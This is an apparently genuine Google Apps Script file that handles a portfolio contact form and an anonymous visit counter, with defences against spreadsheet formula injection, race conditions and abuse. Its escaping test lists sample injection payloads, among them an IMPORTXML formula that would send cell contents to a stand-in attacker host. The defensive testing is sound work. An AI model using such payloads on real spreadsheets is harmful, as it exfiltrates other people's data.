/**
 * Google Apps Script — Contact Form Response Collector and Visit Counter
 *
 * Receives contact-form submissions from the portfolio, appends them to a
 * Google Sheet, and emails the owner. It also keeps the site's own visit
 * counts: POST ?action=count takes the one small payload count.js sends per
 * page view and adds it to daily totals, and GET ?action=stats&token=...
 * serves those totals as JSON for the weekly build of stats.html, to that
 * build alone. See "The visit counter" below and README.md for the payload.
 *
 * This endpoint is PUBLIC (anyone can POST to it), so everything below is
 * written on the assumption that the payload is hostile. Four things this
 * script previously got wrong, and what replaced them:
 *
 *   1. Formula injection. Values were written to the sheet verbatim, so a
 *      message beginning "=", "+", "-" or "@" became a live formula the
 *      moment the sheet was opened — able to call IMPORTXML/HYPERLINK and
 *      exfiltrate neighbouring cells to an attacker's server. Every value
 *      now goes through sanitizeForSheet() and lands as inert text.
 *
 *   2. Concurrent writes. getLastRow()/appendRow() without a lock lets two
 *      simultaneous submissions read the same row number and interleave.
 *      All sheet access now runs inside a LockService critical section.
 *
 *   3. Wrong sheet. getActiveSpreadsheet().getActiveSheet() writes to
 *      whichever tab happens to be active, which is whatever the owner last
 *      clicked. The target is now a configured spreadsheet ID and sheet name.
 *
 *   4. A global rate limiter. One visitor hitting the throttle blocked every
 *      other visitor for the whole window — a denial-of-service anyone could
 *      trigger by double-clicking. Limits are now per-submitter, with the
 *      global counter demoted to a high circuit breaker.
 *
 * CONFIGURATION lives in Script Properties, not in this file, so a fork of
 * the repository never carries someone else's sheet id or secrets:
 *
 *   Extensions → Apps Script → Project Settings → Script Properties
 *
 *     SPREADSHEET_ID    required. The id in the sheet's URL:
 *                       docs.google.com/spreadsheets/d/<THIS PART>/edit
 *                       The visit counts go in the same spreadsheet, on a
 *                       "Daily" tab the script creates.
 *     SHEET_NAME        optional, default "Responses". Created if missing.
 *     OWNER_EMAIL       required. Where notifications are sent.
 *     TURNSTILE_SECRET  optional. When set, every submission must carry a
 *                       valid Cloudflare Turnstile token. See README.
 *     STATS_TOKEN       needed to read the visit counts. GET ?action=stats
 *                       answers only a request whose &token= matches it, and
 *                       nobody at all while it is unset. Any long random
 *                       string; the weekly build keeps the same one in the
 *                       repository secret STATS_SOURCE_URL.
 */

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------

var DEFAULT_SHEET_NAME = 'Responses';
var HEADERS = ['Timestamp', 'Name', 'Email', 'Subject', 'Message', 'Source'];

// Per-submitter limits. These are the ones that actually protect the form.
var MIN_SECONDS_BETWEEN_SUBMISSIONS = 15;   // per submitter, not globally
var MAX_SUBMISSIONS_PER_HOUR = 5;           // per submitter

// A circuit breaker for the endpoint as a whole. Deliberately far above what
// any individual is allowed, so a single visitor cannot trip it for everyone.
var GLOBAL_MAX_SUBMISSIONS_PER_HOUR = 200;

// How long to wait for the sheet lock before giving up and telling the visitor
// to retry. Apps Script's own execution ceiling is well above this.
var LOCK_TIMEOUT_MS = 15000;

// A count waits far less, and a count past the ceiling below does not wait
// at all. Both share the one lock with the contact form, and a count is the
// one that can be dropped: a queue of them in front of a message would make
// the message time out, and the counter exists to measure the form, not to
// compete with it. At a second or so of lock time per count, 30 a minute
// leaves the lock free most of the time; this site sees far fewer.
var COUNT_LOCK_TIMEOUT_MS = 1500;
var COUNT_MAX_PER_MINUTE = 30;

var FIELD_LIMITS = { name: 200, email: 200, subject: 300, message: 5000 };

function getConfig() {
  var props = PropertiesService.getScriptProperties();
  return {
    spreadsheetId: props.getProperty('SPREADSHEET_ID'),
    sheetName: props.getProperty('SHEET_NAME') || DEFAULT_SHEET_NAME,
    ownerEmail: props.getProperty('OWNER_EMAIL'),
    turnstileSecret: props.getProperty('TURNSTILE_SECRET'),
    statsToken: props.getProperty('STATS_TOKEN')
  };
}

// ---------------------------------------------------------------------------
// Spreadsheet formula injection
// ---------------------------------------------------------------------------

/**
 * Makes a value inert before it reaches a cell.
 *
 * Sheets treats a cell as a formula when its first character is one of
 * = + - @, and treats a leading tab or carriage return as whitespace it will
 * strip before applying that same rule — so those have to be caught too
 * (this is the CSV/spreadsheet-injection rule from OWASP). Prefixing a single
 * quote tells Sheets "this is text": the quote is not part of the stored
 * value and is not displayed, so the owner still reads exactly what was sent.
 *
 * Control characters are dropped as well, so a payload cannot smuggle in
 * line-noise that hides the rest of the row when the sheet is read.
 */
function sanitizeForSheet(value) {
  var text = String(value == null ? '' : value);

  // Strip control characters except tab, newline and carriage return, which a
  // legitimate multi-line message may contain.
  text = text.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');

  if (/^[\s]*[=+\-@\t\r]/.test(text)) {
    return "'" + text;
  }
  return text;
}

// ---------------------------------------------------------------------------
// Rate limiting
// ---------------------------------------------------------------------------

/**
 * A stable, non-reversible key for one submitter.
 *
 * Apps Script web apps never see the client IP, so the submitted email is the
 * best available identity. It is hashed rather than stored, so the throttle
 * cache holds no personal data — and a truncated digest is plenty for a cache
 * key. Someone determined can of course vary the address; the honeypot,
 * the global breaker and (when configured) Turnstile cover that case.
 */
function submitterKey(email) {
  var digest = Utilities.computeDigest(
    Utilities.DigestAlgorithm.SHA_256,
    String(email || '').toLowerCase(),
    Utilities.Charset.UTF_8
  );
  var hex = '';
  for (var i = 0; i < 8; i++) {
    hex += ('0' + (digest[i] & 0xFF).toString(16)).slice(-2);
  }
  return hex;
}

/**
 * Returns null when the submission may proceed, or a message explaining why
 * not. Per-submitter checks come first so that a busy endpoint never reports
 * someone else's traffic as this visitor's problem.
 */
function checkRateLimit(email) {
  var cache = CacheService.getScriptCache();
  var key = submitterKey(email);

  if (cache.get('burst-' + key)) {
    return 'You just sent a message — please wait a moment before sending another.';
  }

  var mine = parseInt(cache.get('hour-' + key), 10) || 0;
  if (mine >= MAX_SUBMISSIONS_PER_HOUR) {
    return 'That is several messages from this address in the last hour. Please email me directly instead.';
  }

  // The global counter is a backstop against a broad flood, not a per-visitor
  // limit, which is why the ceiling is an order of magnitude higher.
  var total = parseInt(cache.get('global-hour-count'), 10) || 0;
  if (total >= GLOBAL_MAX_SUBMISSIONS_PER_HOUR) {
    return 'The contact form is unusually busy right now. Please try again later or email me directly.';
  }

  cache.put('burst-' + key, '1', MIN_SECONDS_BETWEEN_SUBMISSIONS);
  cache.put('hour-' + key, String(mine + 1), 3600);
  cache.put('global-hour-count', String(total + 1), 3600);
  return null;
}

// ---------------------------------------------------------------------------
// Cloudflare Turnstile (optional)
// ---------------------------------------------------------------------------

/**
 * Verifies a Turnstile token when TURNSTILE_SECRET is configured.
 *
 * Left unconfigured, this returns null and the honeypot plus the per-submitter
 * limits above are the whole defence — which is a reasonable posture for a
 * personal contact form. Setting the property switches on a real per-visitor
 * challenge without any other change to this script.
 *
 * A verification service that is down must not silently disable the check:
 * an unreachable endpoint fails closed.
 */
function verifyTurnstile(token, secret) {
  if (!secret) return null;
  if (!token) return 'Please complete the verification challenge and try again.';

  try {
    var res = UrlFetchApp.fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'post',
      payload: { secret: secret, response: token },
      muteHttpExceptions: true
    });
    var body = JSON.parse(res.getContentText());
    if (body && body.success === true) return null;
    return 'Verification failed. Please try again.';
  } catch (err) {
    return 'Verification is unavailable right now. Please try again shortly.';
  }
}

// ---------------------------------------------------------------------------
// Sheet access
// ---------------------------------------------------------------------------

/**
 * Opens the configured sheet by id and name — never "whatever tab is active".
 * Creates the tab and its header row on first use.
 */
function getSheet(config) {
  if (!config.spreadsheetId) {
    throw new Error('SPREADSHEET_ID script property is not set');
  }

  var spreadsheet = SpreadsheetApp.openById(config.spreadsheetId);
  var sheet = spreadsheet.getSheetByName(config.sheetName);
  if (!sheet) {
    sheet = spreadsheet.insertSheet(config.sheetName);
  }

  if (sheet.getLastRow() === 0) {
    sheet.appendRow(HEADERS);
    var headerRange = sheet.getRange(1, 1, 1, HEADERS.length);
    headerRange.setFontWeight('bold');
    headerRange.setBackground('#4285f4');
    headerRange.setFontColor('#ffffff');
    sheet.setFrozenRows(1);
  }

  return sheet;
}

/**
 * Appends one submission inside a lock, so two simultaneous POSTs cannot read
 * the same last row and overwrite each other.
 *
 * setValues with the cells forced to plain text is what makes the escaping
 * above stick: appendRow would re-parse a leading "=" as a formula even after
 * the value was quoted.
 */
function appendSubmission(config, row) {
  var lock = LockService.getScriptLock();
  if (!lock.tryLock(LOCK_TIMEOUT_MS)) {
    throw new Error('Could not acquire the sheet lock');
  }

  try {
    var sheet = getSheet(config);
    var target = sheet.getRange(sheet.getLastRow() + 1, 1, 1, row.length);
    target.setNumberFormat('@');           // plain text, for every cell in the row
    target.setValues([row]);
    SpreadsheetApp.flush();                // commit before the lock is released
  } finally {
    lock.releaseLock();
  }
}

// ---------------------------------------------------------------------------
// The visit counter
// ---------------------------------------------------------------------------
//
// count.js, on every page of the site, sends one payload per page view to
// POST ?action=count. Schema v1 is exactly these eight keys (README.md has
// what each one means):
//
//   {"v":1,"page":"index","lens":"","deepest":"contact",
//    "features":["cv-download-hero","cv-download","module-dossier"],
//    "ref":"www.linkedin.com","vp":"m","kb":284}
//
// Nothing in it identifies anyone: there is no id, and Apps Script does not
// give this script the visitor's IP address or user agent, so there is none
// to store.
// Each accepted payload adds one to a handful of daily totals in a "Daily"
// tab, in long format:
//
//   date (Europe/Amsterdam)  metric  key      count
//   2026-09-26               visits           41
//   2026-09-26               page    index    30
//   2026-09-26               kb      index    7210    <- KB summed per page, not counted
//
// metric is visits, page, lens, deepest, feature, ref, vp or kb, plus
// contact, which each accepted contact-form submission adds one to. An empty
// lens, deepest or ref adds nothing: "no lens" is visits minus the lens rows.
//
// Small counts are NOT suppressed here. The build of stats.html does that
// before anything is published. So GET ?action=stats, which serves these
// rows as they are, answers only a request carrying the STATS_TOKEN script
// property as &token=, and nobody while it is unset: this deployment's
// address is in count.js on every page, and stats.html promises that no
// count under 5 and no single day's count is ever published.
//
// Counts are best effort. One that finds the lock busy for more than
// COUNT_LOCK_TIMEOUT_MS, or arrives past COUNT_MAX_PER_MINUTE, is dropped,
// so the contact form never waits behind the counter.
//
// A payload that is not exactly schema v1 is dropped without a word. The
// endpoint is public, and a reply that explained the rejection would only
// help someone shape a better fake.
//
// ?test=1 on either action uses a "DailyTest" tab instead, so a health check
// can send a real payload and read it back (with the token) without moving
// the public numbers. testCounter() below does exactly that from the editor.

var DAILY_SHEET = 'Daily';
var DAILY_TEST_SHEET = 'DailyTest';
var DAILY_HEADERS = ['date', 'metric', 'key', 'count'];
var DAILY_METRICS = ['visits', 'page', 'lens', 'deepest', 'feature', 'ref', 'vp', 'kb', 'contact'];
var COUNT_TIMEZONE = 'Europe/Amsterdam';

// Today's rows are read from the bottom of the tab in slices this long. A
// day has well under a hundred distinct (metric, key) pairs, so one slice is
// almost always the whole of it.
var DAILY_READ_CHUNK = 200;

var BEACON_KEYS = ['v', 'page', 'lens', 'deepest', 'features', 'ref', 'vp', 'kb'];
var BEACON_NAME = /^[a-z0-9-]{1,40}$/;              // page, lens, each feature
var BEACON_ID = /^[\w-]{1,40}$/;                    // deepest: an element id
var BEACON_HOST = /^[a-z0-9.-]{1,253}(:\d{1,5})?$/; // ref: a host, nothing more
var BEACON_MAX_FEATURES = 20;
var BEACON_MAX_KB = 100000;
var BEACON_MAX_CHARS = 4096;                        // a real one is under 1,500

/**
 * True only for a payload that is exactly schema v1: the eight keys and no
 * others, each of the right type and shape. Every string that passes is
 * letters, digits, dots, hyphens, underscores and at most a port's colon,
 * and lands in a plain-text cell, so none of them can become a formula.
 */
function isBeaconV1(p) {
  if (!p || typeof p !== 'object' || Array.isArray(p)) return false;
  var keys = Object.keys(p);
  if (keys.length !== BEACON_KEYS.length) return false;
  for (var i = 0; i < keys.length; i++) {
    if (BEACON_KEYS.indexOf(keys[i]) < 0) return false;
  }
  var blankOr = function (value, pattern) {
    return typeof value === 'string' && (value === '' || pattern.test(value));
  };
  if (p.v !== 1) return false;
  if (typeof p.page !== 'string' || !BEACON_NAME.test(p.page)) return false;
  if (!blankOr(p.lens, BEACON_NAME) || !blankOr(p.deepest, BEACON_ID) || !blankOr(p.ref, BEACON_HOST)) return false;
  if (['s', 'm', 'l'].indexOf(p.vp) < 0) return false;
  if (typeof p.kb !== 'number' || Math.floor(p.kb) !== p.kb || p.kb < 0 || p.kb > BEACON_MAX_KB) return false;
  if (!Array.isArray(p.features) || p.features.length > BEACON_MAX_FEATURES) return false;
  for (var j = 0; j < p.features.length; j++) {
    var f = p.features[j];
    if (typeof f !== 'string' || !BEACON_NAME.test(f) || p.features.indexOf(f) !== j) return false;
  }
  return true;
}

/** The daily totals one accepted payload moves, as [metric, key, amount]. */
function beaconIncrements(p) {
  var inc = [['visits', '', 1], ['page', p.page, 1], ['vp', p.vp, 1]];
  if (p.lens) inc.push(['lens', p.lens, 1]);
  if (p.deepest) inc.push(['deepest', p.deepest, 1]);
  if (p.ref) inc.push(['ref', p.ref, 1]);
  p.features.forEach(function (f) { inc.push(['feature', f, 1]); });
  // Kept per page, so the site's own sustainability statement can report
  // measured transfer by page; a single daily sum could never be split later.
  if (p.kb) inc.push(['kb', p.page, p.kb]);
  return inc;
}

function todayString() {
  return Utilities.formatDate(new Date(), COUNT_TIMEZONE, 'yyyy-MM-dd');
}

/**
 * A cell as the text it was written as. The first three columns are written
 * as plain text; if someone has reformatted the tab, Sheets hands a date
 * back as a Date and a key such as "404" as a number, so both are turned
 * back into the strings they started as.
 */
function cellText(value) {
  if (value instanceof Date) return Utilities.formatDate(value, COUNT_TIMEZONE, 'yyyy-MM-dd');
  return String(value == null ? '' : value);
}

function getDailySheet(config, name) {
  if (!config.spreadsheetId) {
    throw new Error('SPREADSHEET_ID script property is not set');
  }
  var spreadsheet = SpreadsheetApp.openById(config.spreadsheetId);
  var sheet = spreadsheet.getSheetByName(name);
  if (!sheet) {
    sheet = spreadsheet.insertSheet(name);
  }
  if (sheet.getLastRow() === 0) {
    sheet.getRange(1, 1, 1, DAILY_HEADERS.length).setValues([DAILY_HEADERS]);
    sheet.setFrozenRows(1);
  }
  return sheet;
}

/**
 * Adds [metric, key, amount] increments to today's totals, inside the same
 * lock the contact form uses, waiting for it no longer than a count may
 * (COUNT_LOCK_TIMEOUT_MS).
 *
 * Today's rows are always the block at the bottom of the tab: every write is
 * for today, and a new day starts below the last one. So this reads upwards
 * from the end until the date changes, updates the counts in memory, writes
 * the count column of that block back in one call, and appends a row only
 * for a (metric, key) not yet seen today. A visit costs one short read and
 * one or two writes however long the history above it grows, and the tab
 * grows by distinct keys per day, not by visits.
 */
function addToDaily(config, sheetName, increments) {
  var lock = LockService.getScriptLock();
  if (!lock.tryLock(COUNT_LOCK_TIMEOUT_MS)) {
    throw new Error('Could not acquire the sheet lock');
  }

  try {
    var sheet = getDailySheet(config, sheetName);
    var today = todayString();
    var last = sheet.getLastRow();

    var start = last + 1;                  // first row of today's block
    var block = [];
    while (start > 2) {                    // row 1 is the header
      var n = Math.min(DAILY_READ_CHUNK, start - 2);
      var values = sheet.getRange(start - n, 1, n, 4).getValues();
      var k = n;
      while (k > 0 && cellText(values[k - 1][0]) === today) k--;
      block = values.slice(k).concat(block);
      start -= n - k;
      if (k > 0) break;                    // reached an earlier day
    }

    var at = Object.create(null);
    block.forEach(function (row, i) { at[cellText(row[1]) + '\n' + cellText(row[2])] = i; });
    var added = [];
    increments.forEach(function (inc) {
      var id = inc[0] + '\n' + inc[1];
      if (id in at) {
        var row = at[id] < block.length ? block[at[id]] : added[at[id] - block.length];
        row[3] = (Number(row[3]) || 0) + inc[2];
      } else {
        at[id] = block.length + added.length;
        added.push([today, inc[0], inc[1], inc[2]]);
      }
    });

    if (block.length) {
      sheet.getRange(start, 4, block.length, 1).setValues(block.map(function (row) { return [row[3]]; }));
    }
    if (added.length) {
      sheet.getRange(last + 1, 1, added.length, 3).setNumberFormat('@');   // date, metric, key as text
      sheet.getRange(last + 1, 1, added.length, 4).setValues(added);
    }
    SpreadsheetApp.flush();                // commit before the lock is released
  } finally {
    lock.releaseLock();
  }
}

/**
 * Every row since counting began, as [date, metric, key, count]. All of
 * them: stats.html calls its second column "all time" and dates it from the
 * first row, which a window of recent days would quietly make untrue. The
 * totals are a few dozen rows a day, read once a week, so this stays small.
 * The tab is only ever appended to in date order, but the rows are checked
 * one by one anyway, so a hand edit cannot put junk into stats.html.
 */
function readDaily(config, sheetName) {
  if (!config.spreadsheetId) {
    throw new Error('SPREADSHEET_ID script property is not set');
  }
  var sheet = SpreadsheetApp.openById(config.spreadsheetId).getSheetByName(sheetName);
  if (!sheet || sheet.getLastRow() < 2) return [];

  var rows = [];
  sheet.getRange(2, 1, sheet.getLastRow() - 1, 4).getValues().forEach(function (row) {
    var date = cellText(row[0]);
    var metric = cellText(row[1]);
    var count = Number(row[3]);
    if (!/^\d{4}-\d{2}-\d{2}$/.test(date)) return;
    if (DAILY_METRICS.indexOf(metric) < 0 || !isFinite(count)) return;
    rows.push([date, metric, cellText(row[2]), count]);
  });
  return rows;
}

/**
 * True while this minute has had fewer than COUNT_MAX_PER_MINUTE counts, and
 * counts this one. Checked before the lock is asked for, so a burst past the
 * ceiling costs a cache read each and never touches the sheet. The cache is
 * not atomic, so two counts at once can both slip under the ceiling; it is a
 * brake, not an exact limit.
 */
function countThisMinute() {
  var cache = CacheService.getScriptCache();
  var key = 'count-minute-' + Math.floor(Date.now() / 60000);
  var n = parseInt(cache.get(key), 10) || 0;
  if (n >= COUNT_MAX_PER_MINUTE) return false;
  cache.put(key, String(n + 1), 120);
  return true;
}

/**
 * POST ?action=count. Always answers with an empty body, accepted or not:
 * nothing reads the reply, and nothing about a rejection is worth saying.
 */
function handleCount(e, config) {
  try {
    var body = e && e.postData ? String(e.postData.contents || '') : '';
    if (!body || body.length > BEACON_MAX_CHARS) return emptyResponse();

    var payload;
    try {
      payload = JSON.parse(body);
    } catch (parseError) {
      return emptyResponse();
    }
    if (!isBeaconV1(payload)) return emptyResponse();
    if (!countThisMinute()) return emptyResponse();

    var test = e.parameter && e.parameter.test === '1';
    addToDaily(config, test ? DAILY_TEST_SHEET : DAILY_SHEET, beaconIncrements(payload));
  } catch (error) {
    console.error('handleCount failed: ' + (error && error.stack ? error.stack : error));
  }
  return emptyResponse();
}

/**
 * Whether two strings are the same, taking as long to say no to a near miss
 * as to a wild guess, so the time a refusal takes cannot spell out the
 * token a character at a time.
 */
function sameSecret(given, secret) {
  var a = String(given == null ? '' : given);
  var b = String(secret == null ? '' : secret);
  var diff = a.length ^ b.length;
  for (var i = 0; i < b.length; i++) {
    diff |= (i < a.length ? a.charCodeAt(i) : 0) ^ b.charCodeAt(i);
  }
  return diff === 0;
}

/**
 * GET ?action=stats&token=...: {"v":1,"rows":[[date, metric, key, count], ...]}.
 *
 * Without the right token, or with no STATS_TOKEN set at all, the reply is
 * status "refused" and no rows: the rows are unsuppressed, and the address
 * is public. On a failure to read them it is status "error" and no rows,
 * rather than an empty list, so a build that reads it stops instead of
 * publishing a week of zeros; the build treats that one as passing, and
 * tries again the next week.
 */
function statsResponse(e, config) {
  var params = (e && e.parameter) || {};
  if (!config.statsToken || !sameSecret(params.token, config.statsToken)) {
    return jsonResponse('refused', 'The counts are read by the site\'s weekly build, with a token.');
  }
  var test = params.test === '1';
  try {
    var rows = readDaily(config, test ? DAILY_TEST_SHEET : DAILY_SHEET);
    return ContentService.createTextOutput(JSON.stringify({ v: 1, rows: rows }))
      .setMimeType(ContentService.MimeType.JSON);
  } catch (error) {
    console.error('statsResponse failed: ' + error);
    return jsonResponse('error', 'The counts are unavailable right now.');
  }
}

// ---------------------------------------------------------------------------
// HTTP
// ---------------------------------------------------------------------------

function jsonResponse(status, message) {
  return ContentService.createTextOutput(JSON.stringify({
    'status': status,
    'message': message
  })).setMimeType(ContentService.MimeType.JSON);
}

/** The closest Apps Script comes to a 204: no body at all. */
function emptyResponse() {
  return ContentService.createTextOutput('');
}

/**
 * Handles GET requests — a health check that reveals nothing about the
 * spreadsheet behind it. The previous version printed the spreadsheet's name
 * to anyone who loaded the URL. ?action=stats serves the daily visit totals,
 * and only with the right &token= (see statsResponse).
 */
function doGet(e) {
  if (e && e.parameter && e.parameter.action === 'stats') {
    return statsResponse(e, getConfig());
  }
  return ContentService.createTextOutput(JSON.stringify({
    status: 'ok',
    message: 'Contact form endpoint is active. Send submissions as POST.'
  })).setMimeType(ContentService.MimeType.JSON);
}

/**
 * Handles POST requests — validates, rate-limits, records, notifies.
 */
function doPost(e) {
  var config = getConfig();

  // The visit counter shares this deployment, not this path: it is routed
  // away before anything below reads the body as a contact message.
  if (e && e.parameter && e.parameter.action === 'count') {
    return handleCount(e, config);
  }

  try {
    // Two ways in. With JavaScript, the site posts a JSON string. Without it,
    // the <form> posts itself here as application/x-www-form-urlencoded
    // (its action attribute points at this deployment) — before that, a
    // JavaScript-free submit navigated to the portfolio with the visitor's
    // message and email in the query string. Both arrive as the same fields.
    var isForm = !!(e && e.postData && /x-www-form-urlencoded|multipart\/form-data/i.test(e.postData.type || ''));
    var data;
    if (isForm) {
      data = e.parameter || {};
    } else {
      if (!e || !e.postData || !e.postData.contents) {
        return jsonResponse('error', 'No submission data received.');
      }
      try {
        data = JSON.parse(e.postData.contents);
      } catch (parseError) {
        return jsonResponse('error', 'Could not read the submission.');
      }
    }
    if (!data || typeof data !== 'object') {
      return jsonResponse('error', 'Could not read the submission.');
    }
    // A browser is going to render whatever comes back from a form post, so
    // that path is answered with a page rather than a JSON blob.
    var result = handleSubmission(data, config);
    return isForm
      ? htmlResponse(result.status, result.message)
      : jsonResponse(result.status, result.message);
  } catch (error) {
    console.error('doPost failed: ' + (error && error.stack ? error.stack : error));
    return jsonResponse('error', 'Something went wrong on our side. Please try again in a moment.');
  }
}

/**
 * A minimal page for JavaScript-free submissions. No styling to speak of:
 * the point is that the visitor learns what happened and has a way back.
 */
function htmlResponse(status, message) {
  var ok = status === 'success';
  var esc = function (s) {
    return String(s).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  };
  var html = '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">' +
    '<meta name="viewport" content="width=device-width, initial-scale=1">' +
    '<title>' + (ok ? 'Message sent' : 'Message not sent') + '</title>' +
    '<style>body{font-family:system-ui,sans-serif;max-width:36rem;margin:4rem auto;padding:0 1.5rem;line-height:1.6}</style>' +
    '</head><body><h1>' + (ok ? 'Thank you' : 'Something went wrong') + '</h1>' +
    '<p>' + esc(message) + '</p>' +
    '<p><a href="https://moseskolleh.github.io/sustaintheworld/#contact">Back to the portfolio</a></p>' +
    '</body></html>';
  return HtmlService.createHtmlOutput(html);
}

/**
 * Validates, rate-limits, records and notifies. Returns a plain
 * { status, message } that doPost turns into JSON or a page. It used to
 * return the JSON TextOutput itself, which has no .status or .message, so
 * every JavaScript-free submission was answered "Something went wrong" and
 * "undefined" — including the ones that had just been recorded.
 */
function handleSubmission(data, config) {
  var reply = function (status, message) {
    return { status: status, message: message };
  };

  try {
    // Honeypot: real visitors never see this field. If it's filled, a bot
    // did it — claim success so it moves on, but record and send nothing.
    if (data.website) {
      return reply('success', 'Response recorded successfully!');
    }

    var name = String(data.name || '').trim().slice(0, FIELD_LIMITS.name);
    var email = String(data.email || '').trim().slice(0, FIELD_LIMITS.email);
    var subject = String(data.subject || '').trim().slice(0, FIELD_LIMITS.subject);
    var message = String(data.message || '').trim().slice(0, FIELD_LIMITS.message);

    if (!name || !message) {
      return reply('error', 'Name and message are required.');
    }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return reply('error', 'Please provide a valid email address.');
    }

    var challengeError = verifyTurnstile(data.turnstileToken, config.turnstileSecret);
    if (challengeError) {
      return reply('error', challengeError);
    }

    var limited = checkRateLimit(email);
    if (limited) {
      return reply('error', limited);
    }

    // "Source" is visitor-supplied and gets the same treatment as everything
    // else — it is no more trustworthy than the message body.
    var source = String(data.source || '').trim().slice(0, 100);

    appendSubmission(config, [
      new Date(),
      sanitizeForSheet(name),
      sanitizeForSheet(email),
      sanitizeForSheet(subject),
      sanitizeForSheet(message),
      sanitizeForSheet(source)
    ]);

    // One more on today's contact total. The message is already safe in the
    // sheet, so a count that fails must not fail the submission. The site's
    // script sends count: false when the browser asks not to be tracked (Do
    // Not Track or Global Privacy Control), as stats.html promises; a form
    // posted without JavaScript cannot say, and Apps Script does not show
    // this script the request's headers, so that one is counted.
    if (data.count !== false) {
      try {
        addToDaily(config, DAILY_SHEET, [['contact', '', 1]]);
      } catch (countError) {
        console.error('Contact count failed: ' + countError);
      }
    }

    // Notify the owner only. The submitter's address goes in replyTo so a
    // plain "Reply" reaches them — never CC it, or the public endpoint
    // becomes a way to send mail to arbitrary addresses from this account.
    //
    // A failed notification must not fail the submission: the message is
    // already safely in the sheet by this point.
    if (config.ownerEmail) {
      try {
        MailApp.sendEmail(
          config.ownerEmail,
          'New Submission from ' + name,
          'Here are the details of the new response:\n\n' +
          'Name: ' + name + '\n' +
          'Email: ' + email + '\n' +
          'Subject: ' + (subject || 'No Subject') + '\n' +
          'Message: ' + message + '\n\n' +
          'Timestamp: ' + new Date(),
          { replyTo: email }
        );
      } catch (mailError) {
        console.error('Notification email failed: ' + mailError);
      }
    }

    return reply('success', 'Response recorded successfully!');

  } catch (error) {
    // The visitor gets a generic message; the detail goes to the Apps Script
    // log. Returning error.toString() leaked spreadsheet ids and internal
    // paths to anyone who could make the script throw.
    console.error('handleSubmission failed: ' + error);
    return reply('error', 'Something went wrong on our side. Please try again shortly.');
  }
}

// ---------------------------------------------------------------------------
// Tests — run these from the Apps Script editor after deploying
// ---------------------------------------------------------------------------

/**
 * Verifies configuration and connectivity without writing anything.
 */
function testConfiguration() {
  var config = getConfig();
  var problems = [];

  if (!config.spreadsheetId) problems.push('SPREADSHEET_ID is not set');
  if (!config.ownerEmail) problems.push('OWNER_EMAIL is not set');

  if (config.spreadsheetId) {
    try {
      var sheet = getSheet(config);
      Logger.log('Sheet: ' + sheet.getName() + ' (' + sheet.getLastRow() + ' rows)');
    } catch (err) {
      problems.push('Cannot open the sheet: ' + err.message);
    }
  }

  Logger.log(problems.length ? 'PROBLEMS:\n  ' + problems.join('\n  ') : 'Configuration OK');
  return problems;
}

/**
 * Asserts that every spreadsheet-injection payload lands as inert text.
 * These are the exact prefixes Sheets treats as the start of a formula.
 */
function testFormulaEscaping() {
  var payloads = [
    '=IMPORTXML("https://evil.example/?d="&A1,"//a")',
    '+1+1',
    '-1+1',
    '@SUM(A1:A9)',
    '\t=1+1',
    '\r=1+1',
    '  =HYPERLINK("https://evil.example","click")'
  ];
  var safe = ['Normal message', 'a = b in my notes', 'price: 5-3', 'user@example.com'];

  var failures = [];

  payloads.forEach(function (p) {
    var out = sanitizeForSheet(p);
    if (out.charAt(0) !== "'") failures.push('NOT ESCAPED: ' + JSON.stringify(p));
  });

  safe.forEach(function (s) {
    if (sanitizeForSheet(s) !== s) failures.push('OVER-ESCAPED: ' + JSON.stringify(s));
  });

  if (sanitizeForSheet('a\u0007b') !== 'ab') failures.push('control characters not stripped');
  if (sanitizeForSheet('line\nbreak') !== 'line\nbreak') failures.push('newlines in a message must survive');
  if (sanitizeForSheet(null) !== '') failures.push('null not handled');

  Logger.log(failures.length ? 'FAILED:\n  ' + failures.join('\n  ') : 'All escaping tests passed');
  return failures;
}

/**
 * Simulates a form submission end to end. Writes a real row, and adds one to
 * today's contact count on the Daily tab — run it on a test sheet, or undo
 * both afterwards.
 */
function testCapture() {
  var result = doPost({
    postData: {
      type: 'application/json',
      contents: JSON.stringify({
        name: 'Test User',
        email: 'test@example.com',
        subject: 'Test Subject',
        message: 'This is a test submission from the contact form',
        source: 'testCapture()'
      })
    }
  });
  Logger.log(result.getContent());
}

/**
 * Sends one sample visit through the real counter path into the DailyTest
 * tab, and reads it back, without moving the public numbers. A health check
 * can do the same over HTTP: POST the payload to ?action=count&test=1, then
 * GET ?action=stats&test=1&token=<STATS_TOKEN>.
 */
function testCounter() {
  doPost({
    parameter: { action: 'count', test: '1' },
    postData: {
      type: 'text/plain',
      contents: JSON.stringify({
        v: 1, page: 'index', lens: '', deepest: 'contact',
        features: ['cv-download-hero', 'cv-download', 'module-dossier'],
        ref: 'www.linkedin.com', vp: 'm', kb: 284
      })
    }
  });
  var rows = readDaily(getConfig(), DAILY_TEST_SHEET).filter(function (r) { return r[0] === todayString(); });
  Logger.log(rows.length
    ? 'Counter OK: ' + rows.length + ' DailyTest rows for today, e.g. ' + JSON.stringify(rows[0])
    : 'Nothing was recorded. Check the execution log.');
  return rows;
}

/**
 * Get the web app URL (useful after deployment)
 */
function getWebAppUrl() {
  var url = ScriptApp.getService().getUrl();
  Logger.log('Web App URL: ' + url);
  return url;
}
